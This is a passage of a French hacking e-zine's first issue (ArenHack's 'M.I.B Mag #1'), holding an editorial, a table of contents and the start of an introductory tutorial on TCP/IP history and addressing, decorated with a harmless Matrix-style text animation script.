<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>M.I.B Mag #1</title>
<style type="text/css">
.matrix { font-family:Lucida Console, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
</style>

<script type="text/javascript" language="JavaScript">

<!--
var rows=5; // must be an odd number
var speed=5; // lower is faster
var reveal=2; // between 0 and 2 only. The higher, the faster the word appears
var effectalign="center" //enter "center" to center it.

/***********************************************
* The Matrix Text Effect- by Richard Womersley (http://www.mf2fm.co.uk/rv)
* This notice must stay intact for use
* Visit http://www.dynamicdrive.com/ for full source code
***********************************************/

var w3c=document.getElementById && !window.opera;;
var ie45=document.all && !window.opera;
var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;
var m_coch=new Array();
var m_copo=new Array();
window.onload=function() {
	if (!w3c && !ie45) return
  var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];
  ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;
  ma_txt=" "+ma_txt+" ";
  columns=ma_txt.length;
  if (w3c) {
    while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);
    ma_tab=document.createElement("table");
    ma_tab.setAttribute("border", 0);
    ma_tab.setAttribute("align", effectalign);
    ma_tab.style.backgroundColor="#000000";
    ma_bod=document.createElement("tbody");
    for (x=0; x<rows; x++) {
      ma_row=document.createElement("tr");
      for (y=0; y<columns; y++) {
        matemp=document.createElement("td");
        matemp.setAttribute("id", "Mx"+x+"y"+y);
        matemp.className="matrix";
        matemp.appendChild(document.createTextNode(String.fromCharCode(160)));
        ma_row.appendChild(matemp);
      }
      ma_bod.appendChild(ma_row);
    }
    ma_tab.appendChild(ma_bod);
    matrix.appendChild(ma_tab);
  } else {
    ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';
    for (var x=0; x<rows; x++) {
      ma_tab+='<t'+'r>';
      for (var y=0; y<columns; y++) {
        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'">&nbsp;</'+'td>';
      }
      ma_tab+='</'+'tr>';
    }
    ma_tab+='</'+'table>';
    matrix.innerHTML=ma_tab;
  }
  ma_cho=ma_txt;
  for (x=0; x<columns; x++) {
    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));
    m_copo[x]=0;
  }
  ma_bod=setInterval("mytricks()", speed);
}

function mytricks() {
  x=0;
  for (y=0; y<columns; y++) {
    x=x+(m_copo[y]==100);
    ma_row=m_copo[y]%100;
    if (ma_row && m_copo[y]<100) {
      if (ma_row<rows+1) {
        if (w3c) {
          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);
          matemp.firstChild.nodeValue=m_coch[y];
        }
        else {
          matemp=document.all["Mx"+(ma_row-1)+"y"+y];
          matemp.innerHTML=m_coch[y];
        }
        matemp.style.color="#33ff66";
        matemp.style.fontWeight="bold";
      }
      if (ma_row>1 && ma_row<rows+2) {
        matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];
        matemp.style.fontWeight="normal";
        matemp.style.color="#00ff00";
      }
      if (ma_row>2) {
          matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];
        matemp.style.color="#009900";
      }
      if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;
      else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);
      else if (ma_row<rows+2) m_copo[y]++;
      else if (m_copo[y]<100) m_copo[y]=0;
    }
    else if (Math.random()>0.9 && m_copo[y]<100) {
      m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));
      m_copo[y]++;
    }
  }
  if (x==columns) clearInterval(ma_bod);
}

function zoomer(ycol) {
  var mtmp, mtem, ytmp;
  if (m_copo[ycol]==Math.floor(rows/2)+1) {
    for (ytmp=0; ytmp<rows; ytmp++) {
      if (w3c) {
        mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);
        mtmp.firstChild.nodeValue=m_coch[ycol];
      }
      else {
        mtmp=document.all["Mx"+ytmp+"y"+ycol];
        mtmp.innerHTML=m_coch[ycol];
      }
      mtmp.style.color="#33ff66";
      mtmp.style.fontWeight="bold";
    }
    if (Math.random()<reveal) {
      mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));
      ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);
    }
    if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);
    m_copo[ycol]+=199;
    setTimeout("zoomer("+ycol+")", speed);
  }
  else if (m_copo[ycol]>200) {
    if (w3c) {
      mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);
      mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);
    }
    else {
      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];
      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];
    }
    mtmp.style.fontWeight="normal";
    mtem.style.fontWeight="normal";
    setTimeout("zoomer("+ycol+")", speed);
  }
  else if (m_copo[ycol]==200) m_copo[ycol]=100+Math.floor(rows/2);
  if (m_copo[ycol]>100 && m_copo[ycol]<200) {
    if (w3c) {
      mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);
      mtmp.firstChild.nodeValue=String.fromCharCode(160);
      mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);
      mtem.firstChild.nodeValue=String.fromCharCode(160);
    }
    else {
      mtmp=document.all["Mx"+(m_copo[ycol]-101)+"y"+ycol];
      mtmp.innerHTML=String.fromCharCode(160);
      mtem=document.all["Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol];
      mtem.innerHTML=String.fromCharCode(160);
    }
    setTimeout("zoomer("+ycol+")", speed);
  }
}
// -->
</script>
</head>
<body bgcolor="#000000" text="" link="#00CC66">
<div align="center"> 
  <p><font color="#FFFFFF"><img src="M.I.B Mag #1_fichiers/Be-zine.jpg" width="900" height="281"></font></p>
  <p align="justify">&nbsp;</p>
</div>
<div align="justify" id="matrix">Entre l'ombre et l'absence de lumière git la 
  lueur de l'illusion : ArenHack</div>
<p align="center"><font color="#FF0000"> <font color="#000000">------</font></font></p>
<p align="center"><font color="#FF0000"><font color="#000000">------</font>/~~~~~~~\</font><br>
  <font color="#000000">------ </font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4"> <font color="#000000">-</font>Edito</font></strong> 
  <font color="#FF0000">-| &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~/</font></p>
<p align="left"><font color="#FFFFFF">Nous sommes un matin de janvier 2003, il 
  est 9h00. CL@D, JaCkEr et SpS6m3n (&agrave; l'&eacute;poque ils ne savaient 
  m&ecirc;me pas qu'ils allaient s'appeler comme &ccedil;a) rentre en cours d'histoire 
  et comme d'habitude ils s'asseyent au fond de la classe, comme d'habitude le 
  cours est barbant alors ils se mettent &agrave; parler de tout et de rien, ils 
  refont le monde. Et puis SpS6m3n se met &agrave; parler de &quot;Hacking&quot;, 
  ils demandent aux deux autres s'ils en ont d&eacute;j&agrave; entendu parler 
  ; &quot;Non, qu'est-ce que c'est?&quot; alors il leur explique, ils sont tr&egrave;s 
  int&eacute;ress&eacute;s et l'&eacute;coute attentivement, il leur explique 
  &eacute;galement qu'il voudrait faire un site et qu'il a besoin d'aide, &quot;Oui 
  mais nous on connait presque rien pour l'instant&quot;, &quot;ce n'est pas important, 
  avec le temps vous apprendrez...&quot;. Mais il faut trouver un nom pour le 
  site alors ils sortent une feuille de papier et se commencent &agrave; &eacute;crire 
  et &agrave; rayer : &quot;ArenHack!&quot; crie un des trois, un mot sonnant 
  comment une r&eacute;v&eacute;lation pour les 2 autres. La sonnerie retentit 
  alors mais c'&eacute;tait d&eacute;cid&eacute;, un nom &eacute;tait trouv&eacute;, 
  une &eacute;quipe &eacute;tait n&eacute;e, l'aventure ArenHack allait commenc&eacute;...</font></p>
<p align="left"><font color="#FFFFFF">Aujourd'hui le temps a pass&eacute; et ArenHack 
  s'est fait un nom au sein du Hacking Fran&ccedil;ais, il est devenu un site 
  reconnu pour la qualit&eacute; de son contenu et de sa forme, plusieurs apparitions 
  dans diff&eacute;rents magazines comme &quot;Hacker Mag&quot;, &quot;Zataz&quot; 
  (o&ugrave; il fut &eacute;lu site du mois) et &quot;theHackademy&quot; (pour 
  deux de nos membres) t&eacute;moignent de sa popularit&eacute; grandissante. 
  Mais l'&eacute;quipe d'ArenHack a encore beaucoup &agrave; prouver et &agrave; 
  apprendre mais la volont&eacute; est l&agrave; et c'est ce qui importe. </font></p>
<p align="left"><font color="#FFFFFF">Et voil&agrave; nous y sommes enfin, le 
  1er opus du magazine de ArenHack Team : <strong>M.I.B </strong>(<em><strong>M</strong>ulti-system 
  and <strong>I</strong>nternet <strong>B</strong>ase</em>) est sorti. Il pouura 
  paraitre relativement court pour certains lecteurs, et il l'est ind&eacute;niablement, 
  n&eacute;anmoins il est le fruit d'un travail s&eacute;rieux et consciencieux. 
  M.I.B Mag #1 est orient&eacute; Hacking et a pour th&egrave;me principal : &quot;Les 
  bases&quot;. Cependant ne croyez pas trouver ici le manuel du parfait petit 
  script-kiddie avec des titres d'article du genre : &quot;Comment defacer une 
  page web en 10 minutes&quot;, ce n'est pas notre but, &ccedil;a ne l'a jamais 
  &eacute;t&eacute; et &ccedil;a ne le sera jamais. Je vais citer l'&eacute;dito 
  de &quot;TDC Mag #1&quot; dans lequel il est expliqu&eacute; de la meilleure 
  fa&ccedil;on du monde ce qui nous anime tous : &quot;[...]Non, ce n'est pas 
  un simple d&eacute;lire d'adolescent &agrave; la fleur de l'&acirc;ge en manque 
  de gloire... mais bien plus! La soif de connaissance, de partage, d'int&eacute;r&ecirc;t! 
  La solidarit&eacute;![...]&quot;. Notre esprit est celui du partage de la connaissance, 
  nous y mettons un point d'honneur pour que cette connaissance , qui est l'outil 
  de l'intelligence, soit accecible &agrave; tous ; qu'elle ne devienne plus une 
  question d'argent ou de milieu social de croyance ou d'id&eacute;ologie, de 
  fa&ccedil;on d'&ecirc;tre ou de ne pas &ecirc;tre simplement... bref que cette 
  connaissance ne soit plus r&eacute;serv&eacute; &agrave; une minorit&eacute; 
  qui se distinguerait par des avantages illusoires acquis injustement cr&eacute;ant 
  ainsi les barri&egrave;res imaginaires qui emp&ecirc;chent le passage vers la 
  raison &agrave; ceux qui n'ont pas eut cette chance. Notre objectif est de mettre 
  tout le monde &agrave; un pied d'&eacute;galit&eacute; pour que chacun ne se 
  heurte sur le chemin de la connaissance qu'a la barri&egrave;re de la fa&ccedil;on 
  de penser : &quot;<em>Pense ainsi et prend ce chemin o&ugrave; refuse de penser 
  et retourne d'o&ugrave; tu viens...</em>&quot;. L'intelligence est donc la seule 
  arme &agrave; poss&eacute;der et dont nous allons vous apprendre &agrave; vous 
  servir, c'est notre but, vous apprendre &agrave; ma&icirc;triser vos r&ecirc;ves. 
  Connectez vous &agrave; l'Ar&egrave;ne et c'est parti...</font></p>
<p align="left">&nbsp;</p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
</p>

                                    
<p align="center"><font color="#000000">------</font></p>
<p align="center"><font color="#FF0000"><font color="#000000">------</font><font color="#FF0000">/~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">Sommaire</font></strong> <font color="#FF0000">-| 
  &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~/</font></font></p>
<p align="left"><font color="#FFFFFF"><strong>I.</strong> &quot;<strong>Prelude 
  of TCP/IP Knowledge</strong>&quot; (1&egrave;re partie)--<font color="#FF9966"><em>by 
  CL@D</em></font></font></p>
<p align="left"><strong><font color="#FFFFFF">II. </font></strong><font color="#FFFFFF">&quot;<strong>Wireless 
  Network Introduction</strong>&quot;--<em><font color="#FF9966">by TheTchesk</font></em></font></p>
<p align="left"><strong><font color="#FFFFFF">III. </font></strong><font color="#FFFFFF">&quot;<strong>Escape 
  Shell for All</strong>&quot;--<em><font color="#FF9933">by Nocte</font></em></font></p>
<p align="left"><strong><font color="#FFFFFF">IV. </font></strong><font color="#FFFFFF">&quot;<strong>PGP 
  Introducing</strong>&quot;--<em><font color="#FF9933">by JaCkEr</font></em></font></p>
<p align="left"><font color="#FFFFFF"><strong>V. </strong>&quot;<strong>SQL Injection 
  : Black Hole Security</strong>&quot;--<em><font color="#FF9933">by Skin</font></em></font></p>
<p align="left"><strong><font color="#FFFFFF">VI. </font></strong><font color="#FFFFFF">&quot;<strong>Include 
  Vulnerability</strong>&quot;--<em><font color="#FF9933">by Sps6m3n</font></em><strong> 
  </strong></font></p>
<p align="left">&nbsp;</p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
</p>
<p align="center"><font color="#000000">------</font><font color="#FF0000">/~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">Prelude of TCP/IP Knowledge (1&egrave;re 
  partie)</font></strong> <font color="#FF0000">-| &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/</font></p>
</blockquote>
</blockquote>
<p><font size="3" face="Courier New, Courier, mono"><strong><font color="#FFFFFF">Sommaire 
  :</font></strong></font><font color="#FFFFFF"><br>
  ===========</font></p>
<p><u><font color="#FFFFFF" size="3"><strong>I. Qu'est-ce que TCP/IP ?</strong></font></u></p>
<blockquote> 
  <p><font color="#FFFFFF"><u><font color="#CCFFFF">A - D&eacute;finition</font></u></font></p>
  <p><font color="#CCFFFF"><u>B - R&eacute;seaux et protocoles</u></font></p>
  <p><font color="#CCFFFF"><u>C - Historique</u></font></p>
</blockquote>
<p><font color="#FFFFFF"><u><strong>II. Caract&eacute;ristique de TCP/IP</strong></u></font></p>
<blockquote> 
  <div align="left"> 
    <p><u><font color="#CCFFFF">A - Adressage</font></u></p>
  </div>
  <blockquote> 
    <div align="left"><font color="#FFFFFF"><em>1)<u> Introduction</u></em></font></div>
    <p><em><font color="#FFFFFF" face="Times New Roman, Times, serif">2)<strong> 
      </strong><u>Protocole Internet (IP)</u></font></em></p>
    <p><em><font color="#FFFFFF">3) <u>Champs d'en-t&ecirc;te IP</u></font></em></p>
    <p><font color="#FFFFFF"><em><font face="Times New Roman, Times, serif">4) 
      <u>Adressage IP </u></font></em></font></p>
    <p><font color="#FFFFFF"><em>5) <u>Convertion d'une adresse binaire de 32 
      bits au format d&eacute;cimal point&eacute;</u></em></font></p>
    <p><font color="#FFFFFF"><em><font face="Times New Roman, Times, serif">6) 
      <u>Protocole de r&eacute;solution d'adresse (ARP)</u></font></em></font></p>
    <p><font color="#FFFFFF"><em><font face="Times New Roman, Times, serif">7) 
      <u>RARP</u></font></em></font></p>
  </blockquote>
  <p><font color="#CCFFFF">B - <u>Routage</u></font></p>
  <p><font color="#CCFFFF">C - <u>R&eacute;solution d'adresses</u></font></p>
  <p><font color="#CCFFFF">D - <u>Contr&ocirc;le d'erreur et des flots de donn&eacute;es</u></font></p>
</blockquote>
<p><font color="#FFFFFF"><u><strong>III. Le fonctionnement de TCP/IP</strong></strong></u></font></p>
<blockquote> 
  <p><u><font color="#CCFFFF">A - Syst&egrave;me de protocoles TCP/IP</font></u></p>
  <blockquote> 
    <p><em><font color="#FFFFFF">1) <u>Introduction</u></font></em></p>
    <p><font color="#FFFFFF"><em>2) <u>Survol des couches</u></em></font></p>
    <p><em><font color="#FFFFFF" size="3">3) <u>L'encapsulation</u></font></em></p>
  </blockquote>
  <p><font color="#CCFFFF">B - <u>TCP/IP et le mod&egrave;le OSI</u></font></p>
  <p><font color="#CCFFFF" size="3"><u>C - Rapide r&eacute;capitulatif (sc&eacute;nario 
    de base de l'envoie d'une trame sur un r&eacute;seau)</u></font></p>
</blockquote>
<p><u><strong><font color="#FFFFFF">IV. Conclusion</font></strong></u></p>
<blockquote> 
  <p align="center">&nbsp;</p>
  <p align="center"><font color="#FFFFFF">= = = = = = = = = = = = = = = = = = 
    = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
    = = = = = = = = = = = = = = = = </font></p>
</blockquote>
<p>&nbsp;</p>
<p><u><font color="#FFFFFF" size="3"><strong>I. Qu'est-ce que TCP/IP ?</strong></font></u></p>
<blockquote> 
  <p><font color="#CCFFFF"><u>A - D&eacute;finition</u></font></p>
</blockquote>
<p><font color="#FFFFFF"><strong>TCP</strong>/<strong>IP</strong> signifie <em><strong>T</strong>ransfert 
  <strong>C</strong>ontrol <strong>P</strong>rotocol / <strong>I</strong>nternet 
  <strong>P</strong>rotocol</em> ; c'est un syst&egrave;me -<u>une suite de protocoles</u>- 
  pour l'exploitation des r&eacute;seaux de communication.</font></p>
<blockquote> 
  <p><font color="#CCFFFF"><u>B - R&eacute;seaux et protocoles</u></font></p>
</blockquote>
<p><font color="#FFFFFF">Un <em><font color="#33CC99">r&eacute;seau</font> </em>est 
  un ensemble d'ordinateurs ou de machines informatiques qui communiquent gr&acirc;ce 
  &agrave; une technique commune de transmission.</font></p>
<div align="center"> 
  <p><img src="M.I.B Mag #1_fichiers/Figure%201.JPG" width="259" height="135"></p>
  <p><em><font color="#FFFFFF">Figure 1 : Structure d'un r&eacute;seau local</font></em></p>
  <p align="left"><font color="#FFFFFF">Des donn&eacute;es et des appels de donn&eacute;es 
    sont ainsi &eacute;chang&eacute;s entre les machines sur un c&acirc;ble d&eacute;di&eacute;, 
    ou plus simplement sur une ligne t&eacute;l&eacute;phonique. Dans le cas de 
    la figure pr&eacute;c&eacute;dente, la machine A doit pouvoir envoyer un message 
    ou une requ&ecirc;te vers la machine B qui , &agrave; son tour, doit<em> comprendre 
    </em>le message de la machine A afin de lui r&eacute;pondre.</font></p>
  <p align="left"><font color="#FFFFFF">Un ordinateur int&eacute;ragit avec le 
    monde ext&eacute;rieur en ex&eacute;cutant une ou plusieurs applications informatiques, 
    en effectuant des t&acirc;ches et en g&eacute;rant des entr&eacute;es-sorties. 
    Lorsqu'il travaille en r&eacute;seau, ses applications doivent dialoguer avec 
    les applications d'autres machines du r&eacute;seau gr&acirc;ce &agrave; un</font>e 
    <em><font color="#33CC99">suite de protocoles <font color="#FFFFFF">-</font></font></em><u><font color="#33CC99"><font color="#FFFFFF">un 
    ensemble de r&egrave;gles reconnues par toutes les machines du r&eacute;seau 
    pour effectuer sur celui-ci des op&eacute;rations de transfert complexes</font></font></u><font color="#33CC99"><font color="#FFFFFF">-.</font></font></p>
  <p align="left"><font color="#FFFFFF">Les donn&eacute;es transitent de l'application 
    en cours sur la machine A vers l'application ayant &eacute;mis la requ&ecirc;te 
    de la machine B <em>via</em> la carte r&eacute;seau de la machine A, la liaison 
    physique r&eacute;seau et la carte r&eacute;seau de la machine B :</font></p>
  <p align="center"><font color="#FFFFFF"><img src="M.I.B Mag #1_fichiers/Figure%202.JPG" width="396" height="325"></font></p>
  <p align="center"><em><font color="#FFFFFF">Figure 2 : le r&ocirc;le d'une suite 
    de protocoles r&eacute;seau </font></em></p>
  <p align="left"><font color="#FFFFFF">Les protocoles TCP/IP d&eacute;finissent 
    les modalit&eacute;s de communication sur le r&eacute;seau et, en particulier, 
    le format des donn&eacute;es ainsi que les &eacute;l&eacute;ments d'information 
    &agrave; leur adjoindre pour que le destinataire puisse interpr&eacute;ter 
    convenablement le message. TCP/IP et ses protocoles associ&eacute;s forment 
    un syst&egrave;me complet qui d&eacute;finit la mani&egrave;re de traiter, 
    de transmettre et d'exploiter les informations transmises sur un r&eacute;seau 
    (qui fonctionne sous TCP/IP). Un syst&egrave;me de protocoles li&eacute;s 
    les uns aux autres, comme TCP/IP, est appel&eacute; suite de protocoles.</font></p>
  <p align="left"><font color="#FFFFFF">La t&acirc;che consistant &agrave; traiter 
    les transmissions TCP/IP est effectu&eacute;e par un logiciel qui est une 
    <em><font color="#33CC99">impl&eacute;mentation fournisseur </font></em>de 
    TCP/IP. Par exemple, &quot;Microsoft TCP/IP&quot; est un logiciel qui permet 
    &agrave; Windows NT de traiter les donn&eacute;es au format TCP/IP, et donc 
    d'exploiter le r&eacute;seau &agrave; la norme TCP/IP. Il faut bien faire 
    la diff&eacute;rence entre &quot;Standard TCP/IP&quot;, qui est un ensemble 
    de r&egrave;gles qui g&egrave;rent les communications sur r&eacute;seau TCP/IP, 
    et &quot;Impl&eacute;mentation TCP/IP&quot;, qui est un logiciel effectuant 
    les op&eacute;rations qui permettent &agrave; une machine donn&eacute;e de 
    se connecter &agrave; un r&eacute;seau TCP/IP. Le but des &quot;Standard TCP/IP&quot; 
    est d'assurer la compatibilit&eacute; entre toutes les impl&eacute;mentations 
    TCP/IP, quels que soient les fournisseurs ou les impl&eacute;mentation.</font> 
    En gros le mod&egrave;le TCP/IP n'offre aucun service, mais d&eacute;finit 
    les services qui doivent &ecirc;tre offerts. Les impl&eacute;mentations logicielles 
    TCP/IP du fournisseur offrent ces services.</p>
</div>
<blockquote> 
  <div align="left"> 
    <p><u><font color="#CCFFFF">C - Historique</font></u></p>
  </div>
</blockquote>
<div align="left"> 
  <p><font color="#FFFFFF">Les r&eacute;seaux TCP/IP sont issus de la synth&egrave;se 
    de deux d&eacute;veloppement commenc&eacute;s en 1970, et qui ont, depuis, 
    r&eacute;volutionn&eacute; le monde de l'informatique :</font></p>
  <p><font color="#FFFFFF">_Internet</font></p>
  <p><font color="#FFFFFF">_Les r&eacute;seaux locaux (LAN)</font></p>
  <p>&nbsp;</p>
  <p><font color="#FFFFFF"><em>INTERNET</em></font></p>
  <p><font color="#FFFFFF">A la fin des ann&eacute;es 60, les officiels du &quot;<em>Departement 
    Of Defense&quot;</em> s'aper&ccedil;oivent que les militaires poss&egrave;dent 
    une grande quantit&eacute; de machines informatiques diverses, dont certaines 
    travaillent isol&eacute;ment et d'autres en r&eacute;seaux ferm&eacute;s de 
    dimension modeste, dont les protocoles d'exploitation sont incompatible.</font></p>
  <p><font color="#FFFFFF">Les autorit&eacute;s militaires se sont alors demand&eacute; 
    s'il &eacute;tait possible, pour ces machines aux profils tr&egrave;s diff&eacute;rents, 
    de traiter des informations mises en commun. Habitu</font><font color="#FFFFFF">&eacute;s 
    comme ils le sont aux probl&egrave;mes de s&eacute;curit&eacute;, les responsables 
    de la D&eacute;fense se sont imm&eacute;diatement rendu compte qu'un r&eacute;seau 
    de grande ampleur deviendrait une cible id&eacute;al en cas de conflit. La 
    caract&eacute;ristique essentielle de ce r&eacute;seau devait donc d'&ecirc;tre 
    un r&eacute;seau &quot;non -centralis&eacute;&quot;, il ne devait pr&eacute;senter 
    aucun point physiquement vuln&eacute;rables. C'est ainsi que les militaires 
    ont mis au point un r&eacute;seau baptis&eacute; ARPAnet, parce qu'il est 
    issu de l' <em>Advanced Research Projects Agency </em>du DOD. Le syst&egrave;me 
    de protocoles permettant d'exploiter ce r&eacute;seau interconnect&eacute; 
    et d&eacute;centralis&eacute; est &agrave; l'origine de ce qui existe aujourd'hui 
    sous le nom de TCP/IP.</font></p>
  <p><font color="#FFFFFF">Les deux principes essentiels de TCP/IP sur lesquels 
    repose cet environnement de caract&egrave;re d&eacute;centralis&eacute; sont 
    les suivants :</font></p>
  <p><font color="#FFFFFF">_<strong>V&eacute;rification des noeuds terminaux </strong>: 
    les deux ordinateurs en train d'&eacute;changer des informations (appel&eacute;s 
    <em>noeuds terminaux </em>parce qu'ils sont plac&eacute;s aux deux extr&eacute;mit&eacute;s 
    de la cha&icirc;ne qui achemine le message) ont pour obligation d'accuser 
    la r&eacute;ception de la transmission et d'en v&eacute;rifier le contenu. 
    Tous les ordinateurs fonctionnent de fa&ccedil;on banalis&eacute;e, car aucun 
    site centralis&eacute; ne surveille les &eacute;changes.</font></p>
  <p><font color="#FFFFFF">_<strong>Routage dynamique </strong>: les noeuds du 
    r&eacute;seau peuvent &ecirc;tre connect&eacute;s par de multiples itin&eacute;raires, 
    dont la configuration d&eacute;pend des opportunit&eacute;s du moment.</font></p>
  <p>&nbsp;</p>
  <p><em><font color="#FFFFFF">LES LAN, RESEAU LOCAUX</font></em></p>
  <p><font color="#FFFFFF">Tandis qu'Internet se propage dans les universit&eacute;s, 
    entreprises..., un autre concept prend forme, celui du r&eacute;seau local, 
    le <em>Local Area Network (LAN).</em> </font></p>
  <p><font color="#FFFFFF">Les protocoles LAN ne donnent pas tous acc&egrave;s 
    &agrave; Internet et ce dernier devenant de plus en plus populaire, les utilisateurs 
    de LAN d&eacute;sirent &agrave; leur tour acc&eacute;der &agrave; ce r&eacute;seau, 
    ce qui fait appara&icirc;tre une multitude de solutions pour raccorder les 
    possesseurs de LAN. Des <em><font color="#33CC99">passerelles </font></em>(<u>routeur 
    qui connecte un LAN &agrave; un grand r&eacute;seau. Ce terme est utilis&eacute; 
    parfois pour d&eacute;signer un routeur qui effectue des conversions de protocoles</u>), 
    sp&eacute;cialis&eacute;es leur offrent les convertions de protocoles indispensables 
    pour acc&eacute;der &agrave; Internet. Les versions r&eacute;centes de Netware, 
    de MacOS et de Windows ont continu&eacute; d'accro&icirc;tre la pr&eacute;pond&eacute;rance 
    de TCP/IP dans les r&eacute;seaux locaux. La popularit&eacute; croissante 
    des syst&egrave;mes <em>Unix, </em>tels sue Linux, BSD, Solaris et Apple OS 
    X, a &eacute;galement contribu&eacute; &agrave; la pr&eacute;dominance de 
    TCP/IP dans le monde des r&eacute;seaux.</font></p>
  <p align="center"><img src="M.I.B Mag #1_fichiers/Figure%203.JPG" width="675" height="240"></p>
  <p align="center"><em><font color="#FFFFFF">Figure 3 : connection d'un LAN &agrave; 
    un grand r&eacute;seau</font></em></p>
</div>
<div align="left"> 
  <p><font color="#FFFFFF"><u><strong>II. Caract&eacute;ristique de TCP/IP</strong></u></font></p>
</div>
<blockquote> 
  <div align="left"> 
    <p><u><font color="#CCFFFF">A - Adressage </font></u></p>
  </div>
  <blockquote> 
    <div align="left"><font color="#FFFFFF"><em>1)<u> Introduction</u></em></font></div>
  </blockquote>
</blockquote>
<div align="left"> 
  <p><font color="#FFFFFF">Une carte r&eacute;seau poss&egrave;de une <font color="#33CC66"><em><font color="#33cc99">adresse 
    physique</font></em></font><font color="#006666"><em> </em></font>unique et 
    permanente. L'adresse physique est un nombre attribu&eacute; &agrave; cette 
    carte lors de sa fabrication. Sur un r&eacute;seau local, les protocoles de 
    bas niveau, li&eacute;s au mat&eacute;riel, acheminent des donn&eacute;es 
    sur le r&eacute;seau en utilisant cette adresse physique. Il existe des r&eacute;seaux 
    de genres tr&egrave;s divers et chacun achemine les donn&eacute;es &agrave; 
    sa fa&ccedil;on. Dans le cas d'une liaison <font color="#33CC99"><em>Ethernet 
    </em><font color="#FFFFFF">(<u>d&eacute;signe une architecture de r&eacute;seau 
    local</u>) standard, par exemple, l'ordinateur exp&eacute;die ses messages 
    directement sur la liaison. La carte r&eacute;seau de chaque ordinateur examine 
    la totalit&eacute; du traffic sur le r&eacute;seau local afin d'en extraire 
    les messages qui concernent sa propre adresse physique.</font></font></font></p>
  <p><font color="#FFFFFF">Dans le cas des grands r&eacute;seaux, il est &eacute;vident 
    que la carte r&eacute;seau d'une machine ne peut examiner la totalit&eacute; 
    du trafic. En effet, &eacute;tant donn&eacute; le nombre croissant des machines 
    connect&eacute;s &agrave; Internet, le principe de l'adressage physique serait 
    intenable. Ces grands r&eacute;seaux sont pour la plupart subdiviser en <font color="#33CC99"><em>sous-r&eacute;seaux 
    ou subnet </em><font color="#FFFFFF">(<u>subdivision logique de l'espace d'adressage 
    d&eacute;finie par un identificateur de r&eacute;seau TCP/IP</u>)</font></font> 
    pour leur permettre de ma&icirc;triser le trafic du r&eacute;seau. Ces m&ecirc;mes 
    sous-r&eacute;seaux sont hierarchis&eacute;s de mani&egrave;re &agrave; ce 
    qu'un message soit achemin&eacute; de fa&ccedil;on optimale vers sa destination. 
    TCP/IP offre cette possibilit&eacute; de subdivision gr&acirc;ce &agrave; 
    l'<em><font color="#33CC99">adressage logique<font color="#FFFFFF">. </font></font></em><font color="#33CC99"><font color="#FFFFFF">Cette 
    adresse est &eacute;labor&eacute;e par le logiciel de communication. Sous 
    TCP/IP, l'adressage logique d'un ordinateur est une <em><font color="#33CC99">adresse 
    IP</font></em> (<u>adresse logique permettant de localiser un ordinateur sur 
    un r&eacute;seau TCP/IP</u>).</font></font></font></p>
  <p><font color="#FFFFFF">Une adresse physique ressemble &agrave; &ccedil;a :</font></p>
  <div align=center>
  <table width="15%" border="1" bordercolor="#FF0000">
    <tr> 
      <td height="23" bordercolor="#FF0000" bgcolor="#FFFFFF"> 
        <div align="center"><font color="#000000">00-E0-98-07-8E-39</font></div></td>
    </tr>
  </table>
  </div>
  <p><font color="#FFFFFF">Ainsi TCP/IP masque l'adresse physique de la carte 
    r&eacute;seau et organise le r&eacute;seau en un sh&eacute;ma d'adressage 
    logique et hierarchique. Ce sh&eacute;ma d'adressage logique est g&eacute;r&eacute; 
    par le protocole <strong>IP</strong> (<em><strong>I</strong>nternet <strong>P</strong>rotocole</em>) 
    de la <font color="#FF9933">couche Internet</font> (j'expliquerai plus loin 
    le foctionnement des diff&eacute;rentes couches de TCP/IP). Un autre protocole 
    de la couche Internet, appel&eacute; <strong>ARP</strong> (<em><strong>A</strong>ddress 
    <strong>R</strong>esolution <strong>P</strong>rotocole</em>) maintient une 
